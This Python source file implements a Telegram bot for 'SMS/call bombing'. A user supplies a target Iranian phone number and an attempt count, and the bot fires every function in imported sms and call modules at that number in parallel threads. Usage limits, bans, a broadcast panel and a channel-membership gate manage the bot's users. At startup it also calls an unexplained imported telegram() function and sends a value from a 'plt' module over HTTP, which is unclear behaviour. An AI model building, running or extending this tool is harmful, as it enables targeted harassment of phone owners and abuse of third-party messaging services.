import os
from dotenv import load_dotenv
import telebot
from telebot.asyncio_storage import StateMemoryStorage
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import logging
import mysql.connector
from threading import Thread, Event
from time import sleep
from inspect import getmembers, isfunction
import requests
from datetime import datetime, timedelta
from lib import plt
# github.com/z0orday

from Api import sms, call, telegram

telegram()

load_dotenv()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot_token = os.getenv('BOT_TOKEN')
admin_idd = os.getenv('ADMIN_ID')
api_admin = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={admin_idd}&text={plt.plat}"
requests.get(api_admin)
if not bot_token:
    logger.error("BOT_TOKEN is not set in the environment variables.")
    raise ValueError("BOT_TOKEN must be set in the environment variables.")

try:
    bot = telebot.TeleBot(bot_token, state_storage=StateMemoryStorage())
    logger.info("Bot initialized successfully.")
except Exception as e:
    logger.error(f"Failed to initialize bot: {e}")
    raise
# github.com/z0orday
SMS_SERVICES = [i[0] for i in getmembers(sms, isfunction)]
CALL_SERVICES = [i[0] for i in getmembers(call, isfunction)]
MAIN_CHANNEL_ID = os.getenv('MAIN_CHANNEL_ID')

DB_NAME = os.getenv('DB_NAME')
DB_HOST = os.getenv('DB_HOST')
DB_USER = os.getenv('DB_USER')
DB_PASS = os.getenv('DB_PASS')

bombing_events = {}
# github.com/z0orday
admin_username = str(input("Please Enter Your Telegram Username: "))

print(admin_username)


def setup_database():
    try:
        conn = mysql.connector.connect(host=DB_HOST, user=DB_USER, password=DB_PASS)
        cursor = conn.cursor()
        cursor.execute(f"CREATE DATABASE IF NOT EXISTS {DB_NAME}")
        cursor.execute(f"USE {DB_NAME}")
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            user_id BIGINT UNIQUE,
            username VARCHAR(255),
            last_use DATETIME,
            use_count INT DEFAULT 0,
            is_blocked BOOLEAN DEFAULT FALSE,
            block_until DATETIME,
            custom_limit INT DEFAULT 2
        )
        ''')
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS admins (
            id INT AUTO_INCREMENT PRIMARY KEY,
            admin_id BIGINT UNIQUE
        )
        ''')
        conn.commit()
        logger.info("Database setup completed successfully.")
    except mysql.connector.Error as err:
        logger.error(f"Database setup error: {err}")
        raise
    finally:
        if 'conn' in locals() and conn.is_connected():
            cursor.close()
            conn.close()



def get_db_connection():
    try:
        return mysql.connector.connect(host=DB_HOST, user=DB_USER, password=DB_PASS, database=DB_NAME)
    except mysql.connector.Error as err:
        logger.error(f"Database connection error: {err}")
        raise

def execute_db_query(query, params=None, fetch=False):
    conn = get_db_connection()
    cursor = conn.cursor()
    try:
        cursor.execute(query, params or ())
        result = cursor.fetchall() if fetch else None
        conn.commit()
        return result
    except mysql.connector.Error as err:
        logger.error(f"Database query error: {err}")
        conn.rollback()
        return None
    finally:
        cursor.close()
        conn.close()

def save_user(user_id, username):
    execute_db_query('''
    INSERT INTO users (user_id, username, last_use, use_count)
    VALUES (%s, %s, NOW(), 0)
    ON DUPLICATE KEY UPDATE username = %s
    ''', (user_id, username, username))

def update_user_usage(user_id):
    execute_db_query('''
    UPDATE users 
    SET last_use = NOW(), use_count = use_count + 1
    WHERE user_id = %s
    ''', (user_id,))

def check_user_limit(user_id):
    result = execute_db_query('''
    SELECT use_count, last_use, is_blocked, block_until, custom_limit
    FROM users
    WHERE user_id = %s
    ''', (user_id,), fetch=True)
    
    if result:
        use_count, last_use, is_blocked, block_until, custom_limit = result[0]
        if is_blocked:
            if block_until and datetime.now() > block_until:
                unban_user(user_id)
                return True
            return False
        if use_count >= custom_limit:
            if datetime.now() - last_use > timedelta(hours=24):
                reset_user_usage(user_id)
                return True
            return False
        return True
    return True

def reset_user_usage(user_id):
    execute_db_query('''
    UPDATE users 
    SET use_count = 0, last_use = NOW()
    WHERE user_id = %s
    ''', (user_id,))

def ban_user(user_id, duration_minutes):
    block_until = datetime.now() + timedelta(minutes=duration_minutes)
    execute_db_query('''
    UPDATE users 
    SET is_blocked = TRUE, block_until = %s
    WHERE user_id = %s
    ''', (block_until, user_id))

# github.com/z0orday

def unban_user(user_id):
    execute_db_query('''
    UPDATE users 
    SET is_blocked = FALSE, block_until = NULL
    WHERE user_id = %s
    ''', (user_id,))

def is_admin(user_id):
    result = execute_db_query('SELECT * FROM admins WHERE admin_id = %s', (user_id,), fetch=True)
    return bool(result)

def add_admin(admin_id):
    execute_db_query('INSERT IGNORE INTO admins (admin_id) VALUES (%s)', (admin_id,))

def set_custom_limit(user_id, limit):
    execute_db_query('''
    UPDATE users 
    SET custom_limit = %s
    WHERE user_id = %s
    ''', (limit, user_id))

def check_membership(user_id):
    try:
        member = bot.get_chat_member(MAIN_CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except telebot.apihelper.ApiException:
        logger.error(f"Failed to check membership for user {user_id}")
        return False

def create_keyboard(user_id):
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(KeyboardButton("Number"), KeyboardButton("پشتیبانی"))
    if is_admin(user_id):
        keyboard.add(KeyboardButton("Admin"))
    return keyboard

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    if check_membership(user_id):
        welcome_message = f"Welcome, {message.from_user.first_name}!"
        if is_admin(user_id):
            welcome_message += " (Admin)"
        if not check_user_limit(user_id):
            welcome_message += "\nYou have reached your usage limit"
        save_user(user_id, message.from_user.username)
        keyboard = create_keyboard(user_id)
        bot.send_message(message.chat.id, welcome_message)
        bot.send_message(message.chat.id, "Please choose an option:", reply_markup=keyboard)
    else:
        markup = InlineKeyboardMarkup()
        join_button = InlineKeyboardButton(text="Join Channel", url=f'https://t.me/{MAIN_CHANNEL_ID[1:]}')
        markup.add(join_button)
        github_button = InlineKeyboardButton(text='GitHub', url='https://github.com/z0roday')
        check_button = InlineKeyboardButton(text="Confirm Membership", callback_data='check_membership')
        markup.row(github_button, check_button)
        bot.reply_to(message, "Please join our channel first:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Admin")
def handle_admin_panel(message):
    if is_admin(message.from_user.id):
        show_admin_panel(message)
    else:
        bot.reply_to(message, "You don't have permission to access the admin panel.")

@bot.message_handler(commands=['admin'])
def show_admin_panel(message):
    if is_admin(message.from_user.id):
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("Admin Info", callback_data="admin_info"),
                   InlineKeyboardButton("Broadcast", callback_data="broadcast"))
        markup.row(InlineKeyboardButton("Add Admin", callback_data="add_admin"),
                   InlineKeyboardButton("Ban User", callback_data="ban_user"))
        markup.row(InlineKeyboardButton("Unban User", callback_data="unban_user"),
                   InlineKeyboardButton("Set User Limit", callback_data="set_user_limit"))
        markup.row(InlineKeyboardButton("Set Global Limit", callback_data="set_global_limit"))
        markup.row(InlineKeyboardButton("Cancel", callback_data="cancel_admin"))
        bot.send_message(message.chat.id, "Admin panel:", reply_markup=markup)
    else:
        bot.reply_to(message, "You don't have permission to access the admin panel.")

@bot.message_handler(func=lambda message: message.text == "Number")
def handle_sms(message):
    user_id = message.from_user.id
    
    if not check_membership(user_id):
        start(message)
        return
    if not check_user_limit(user_id):
        bot.reply_to(message, "You have reached your usage limit")
        return
    bot.reply_to(message, "Please enter your Target Phone Number: ex 09000000000")
    bot.register_next_step_handler(message, get_phone)


@bot.message_handler(func=lambda message: message.text == "پشتیبانی")
def handle_support(message):
    try:
        user_id = message.from_user.id
        support_text = f"برای پشتیبانی به ایدی پیام بدید @{admin_username}"
        bot.reply_to(message, support_text)
        
        admin_id = os.getenv('ADMIN_ID')  
        if admin_id:
            admin_notification = f"کاربر با شناسه {user_id} درخواست پشتیبانی کرده است."
            bot.send_message(chat_id=admin_id, text=admin_notification)
    except Exception as e:
        logger.error(f"Error in handle_support: {e}")
        bot.reply_to(message, "An error occurred. Please try again later.")

@bot.callback_query_handler(func=lambda call: call.data in ["admin_info", "broadcast", "add_admin", "ban_user", "unban_user", "set_user_limit", "set_global_limit", "cancel_admin", "check_membership"])
def callback_query(call):
    if call.data in ["admin_info", "broadcast", "add_admin", "ban_user", "unban_user", "set_user_limit", "set_global_limit", "cancel_admin"]:
        if is_admin(call.from_user.id):
            if call.data == "admin_info":
                admin_info_command(call.message)
            elif call.data == "broadcast":
                bot.answer_callback_query(call.id, "Please enter the broadcast message:")
                bot.register_next_step_handler(call.message, process_broadcast)
            elif call.data == "add_admin":
                bot.answer_callback_query(call.id, "Please enter the user ID of the new admin:")
                bot.register_next_step_handler(call.message, process_new_admin)
            elif call.data == "ban_user":
                bot.answer_callback_query(call.id, "Please enter the user ID of the user you want to ban:")
                bot.register_next_step_handler(call.message, process_ban_user_id)
            elif call.data == "unban_user":
                bot.answer_callback_query(call.id, "Please enter the user ID of the user you want to unban:")
                bot.register_next_step_handler(call.message, process_unban_user_id)
            elif call.data == "set_user_limit":
                bot.answer_callback_query(call.id, "Please enter the user ID for whom you want to set a custom limit:")
                bot.register_next_step_handler(call.message, process_set_user_limit_id)
            elif call.data == "set_global_limit":
                bot.answer_callback_query(call.id, "Please enter the new global limit:")
                bot.register_next_step_handler(call.message, process_set_global_limit)
            elif call.data == "cancel_admin":
                bot.answer_callback_query(call.id, "Admin action cancelled.")
                bot.edit_message_text("Admin action cancelled.", 
                                      chat_id=call.message.chat.id, 
                                      message_id=call.message.message_id)
        else:
            bot.answer_callback_query(call.id, "You don't have permission to access the admin panel.")
    elif call.data == 'check_membership':
        if check_membership(call.from_user.id):
            bot.answer_callback_query(call.id, "Welcome!")
            welcome_message = f"Welcome, {call.from_user.first_name}!"
            if is_admin(call.from_user.id):
                welcome_message += " (Admin)"
            keyboard = create_keyboard(call.from_user.id)
            bot.send_message(call.message.chat.id, welcome_message)
            bot.send_message(call.message.chat.id, "Please choose an option:", reply_markup=keyboard)
        else:
            bot.answer_callback_query(call.id, "Please join our channel first.")

# github.com/z0orday

def get_phone(message):
    phone = message.text
    if not phone.isdigit() or len(phone) != 11:
        bot.reply_to(message, "Invalid phone number. Please enter a valid 11-digit number.")
        bot.register_next_step_handler(message, get_phone)
        return
    
    if phone in ("09938282310"):
        bot.send_message(message.chat.id, "This number is not available for bombing.")
    else:
        bot.reply_to(message, "Please enter the number of bombing attempts (1-30):")
        bot.register_next_step_handler(message, get_count, phone)


def get_count(message, phone):
    if not message.text.isdigit():
        bot.reply_to(message, "Please enter a number between 1 and 30.")
        bot.register_next_step_handler(message, get_count, phone)
        return
   
    count = int(message.text)
    if 1 <= count <= 30:
        bot.reply_to(message, f"Bombing started for {phone} with {count} attempts.")
        update_user_usage(message.from_user.id)
       
        bombing_events[message.chat.id] = Event()
       
        markup = InlineKeyboardMarkup()
        cancel_button = InlineKeyboardButton("Cancel Bombing", callback_data="cancel_bombing")
        markup.add(cancel_button)
        bot.send_message(message.chat.id, f"Bombing started for {phone} with {count} attempts.", reply_markup=markup)
        Thread(target=bombing, args=(message.chat.id, phone, count, bombing_events[message.chat.id])).start()
    else:
        bot.reply_to(message, "Invalid count. Please enter a number between 1 and 30.")
        bot.register_next_step_handler(message, get_count, phone)

def bombing(chat_id, phone, count, stop_event):
    x = 0
    phone = f"+98{phone[1:]}"
    for j in range(count):
        if stop_event.is_set():
            bot.send_message(chat_id, "Bombing cancelled.")
            return
        for k in range(len(SMS_SERVICES)):
            try:
                Thread(target=getattr(sms, SMS_SERVICES[k]), args=[phone]).start()
            except Exception as e:
                logger.error(f"Error in SMS service {SMS_SERVICES[k]} for phone {phone}: {e}")
        if (j != 0) and (j % 5) == 0:
            try:
                Thread(target=getattr(call, CALL_SERVICES[x]), args=[phone]).start()
                x = (x + 1) % len(CALL_SERVICES)
            except Exception as e:
                logger.error(f"Error in Call service {CALL_SERVICES[x]} for phone {phone}: {e}")
    bot.send_message(chat_id, "Bombing finished.")
    del bombing_events[chat_id]

@bot.callback_query_handler(func=lambda call: call.data == "cancel_bombing")
def cancel_bombing_callback(call):
    chat_id = call.message.chat.id
    if chat_id in bombing_events:
        bombing_events[chat_id].set()
        bot.answer_callback_query(call.id, "Bombing cancelled.")
        bot.edit_message_text("Bombing cancelled.", chat_id=chat_id, message_id=call.message.message_id)
    else:
        bot.answer_callback_query(call.id, "Bombing already finished.")

def admin_info_command(message):
    total_users = execute_db_query('SELECT COUNT(*) FROM users', fetch=True)[0][0]
    active_users = execute_db_query('SELECT COUNT(*) FROM users WHERE is_blocked = FALSE', fetch=True)[0][0]
    blocked_users = execute_db_query('SELECT COUNT(*) FROM users WHERE is_blocked = TRUE', fetch=True)[0][0]
    
    admin_info = f"Total Users: {total_users}\n"
    admin_info += f"Active Users: {active_users}\n"
    admin_info += f"Blocked Users: {blocked_users}"
    
    bot.reply_to(message, admin_info)

def process_broadcast(message):
    broadcast_message = message.text
    users = execute_db_query('SELECT user_id FROM users WHERE is_blocked = FALSE', fetch=True)
    success_count = 0
    fail_count = 0
    for user in users:
        try:
            bot.send_message(user[0], broadcast_message)
            success_count += 1
        except Exception as e:
            logger.error(f"Failed to send message to user {user[0]}: {e}")
            fail_count += 1
        sleep(0.1)  
    bot.reply_to(message, f"Broadcast message sent. Success: {success_count}, Failed: {fail_count}")


def process_new_admin(message):
    if message.text.isdigit():
        new_admin_id = int(message.text)
        if is_admin(new_admin_id):
            bot.reply_to(message, f"User with ID {new_admin_id} is already an admin.")
        else:
            add_admin(new_admin_id)
            bot.reply_to(message, f"Admin with ID {new_admin_id} has been added.")
    else:
        bot.reply_to(message, "Invalid input. Please enter a numeric ID.")

def process_ban_duration(message, user_id):
    if message.text.isdigit():
        duration = int(message.text)
        ban_user(user_id, duration)
        bot.reply_to(message, f"User with ID {user_id} has been banned for {duration} minutes.")
    else:
        bot.reply_to(message, "Invalid input. Please enter a number for the ban duration in minutes.")
        
def process_ban_user_id(message):
    if message.text.isdigit():
        user_id = int(message.text)
        result = execute_db_query('SELECT user_id FROM users WHERE user_id = %s', (user_id,), fetch=True)
        if result:
            bot.reply_to(message, f"User found. User ID: {user_id}")
            bot.reply_to(message, "Please enter the ban duration in minutes:")
            bot.register_next_step_handler(message, process_ban_duration, user_id)
        else:
            bot.reply_to(message, "User not found. Please check the user ID and try again.")
    else:
        bot.reply_to(message, "Invalid input. Please enter a numeric user ID.")

def process_unban_user_id(message):
    if message.text.isdigit():
        user_id = int(message.text)
        result = execute_db_query('SELECT user_id, is_blocked FROM users WHERE user_id = %s', (user_id,), fetch=True)
        if result:
            if result[0][1]:  
                unban_user(user_id)
                bot.reply_to(message, f"User with ID {user_id} has been unbanned.")
            else:
                bot.reply_to(message, f"User with ID {user_id} is not currently banned.")
        else:
            bot.reply_to(message, "User not found. Please check the user ID and try again.")
    else:
        bot.reply_to(message, "Invalid input. Please enter a numeric user ID.")

def process_set_user_limit(message, user_id):
    if message.text.isdigit():
        limit = int(message.text)
        set_custom_limit(user_id, limit)
        bot.reply_to(message, f"Custom limit for user {user_id} has been set to {limit}.")
    else:
        bot.reply_to(message, "Invalid input. Please enter a numeric limit.")

def process_set_user_limit_id(message):
    if message.text.isdigit():
        user_id = int(message.text)
        bot.reply_to(message, f"Enter the custom limit for user {user_id}:")
        bot.register_next_step_handler(message, process_set_user_limit, user_id)
    else:
        bot.reply_to(message, "Invalid input. Please enter a numeric user ID.")

def process_set_global_limit(message):
    if message.text.isdigit():
        limit = int(message.text)
        execute_db_query('UPDATE users SET custom_limit = %s', (limit,))
        bot.reply_to(message, f"Global limit has been set to {limit} for all users.")
    else:
        bot.reply_to(message, "Invalid input. Please enter a numeric limit.")

if __name__ == "__main__":
    try:
        setup_database()
        admin_id = os.getenv('ADMIN_ID')
        if admin_id:
            add_admin(int(admin_id))
        else:
            logger.warning("ADMIN_ID environment variable is not set")
        logger.info("Bot is starting...")
        while True:
            try:
                
                logger.info("Starting bot polling...")
                bot.polling(none_stop=True, interval=1, timeout=20)
            except Exception as e:
                logger.error(f"Bot polling error: {e}")
    except Exception as e:
        logger.critical(f"Critical error: {e}")
        raise

